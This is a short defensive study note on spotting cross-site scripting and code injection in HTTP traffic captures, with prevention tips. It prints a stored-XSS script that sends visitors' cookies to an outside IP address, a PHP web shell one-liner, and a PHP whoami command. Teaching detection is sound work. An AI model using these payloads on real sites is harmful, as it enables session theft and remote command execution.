<img width="891" height="401" alt="image" src="https://github.com/user-attachments/assets/d8ba1b27-20f9-46a6-81ca-866ab84d3b9b" /># Cross-Site Scripting (XSS) & Code Injection Detection

**Related PCAP File(s):**

- `XSS_Simple.pcapng`

Suppose we were looking through our HTTP requests and noticed that a good amount of requests were being sent to an internal "server," we did not recognize. This could be a clear indication of cross-site scripting. Let's take the following output for example.

<img width="1028" height="463" alt="image" src="https://github.com/user-attachments/assets/17f18606-2374-4c06-bb6a-52be0d540d21" />

We might notice alot of values being sent over, and in real cases this might not be as obvious that these are user's cookies/tokens. Instead, it might even be encoded or encrypted while it is in transit. Essentially speaking, cross-site scripting works through an attacker injecting malicious javascript or script code into one of our web pages through user input. When other users visit our web server their browsers will execute this code. Attackers in many cases will utilize this technique to steal tokens, cookies, session values, and more. If we were to follow one of these requests it would look like the following.

<img width="891" height="401" alt="image" src="https://github.com/user-attachments/assets/0c127cd9-6bcc-485d-864b-42a4e9545532" />

Getting down to the root of where this code is originating can be somewhat tricky. However, suppose we had a user comment area on our web server. We might notice one of the comments looks like the following.

```javascript
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```

This would be successful cross-site scripting from the attacker, and as such we would want to remove this comment quickly, and even in most cases bring our server down to fix the issue before it persists. We might also notice in some cases, that an attacker might attempt to inject code into these fields like the following two examples.

In order for them to get command and control through PHP.

```php
<?php system($_GET['cmd']); ?>
```

Or to execute a single command with PHP:

```php
<?php echo `whoami` ?>
```

## Preventing XSS and Code Injection

In order to prevent these threats after we detect them, we can do the following.

- Sanitize and handle user input in an acceptable manner.
- Do not interpret user input as code.

## 🔑 Key Takeaway

Cross-Site Scripting (XSS) and code injection attacks exploit improperly handled user input to execute malicious scripts or commands. Monitoring suspicious HTTP requests, unexpected outbound connections, and injected code can help detect these attacks. Sanitizing user input and ensuring that user-provided data is never interpreted as executable code are essential preventive measures.
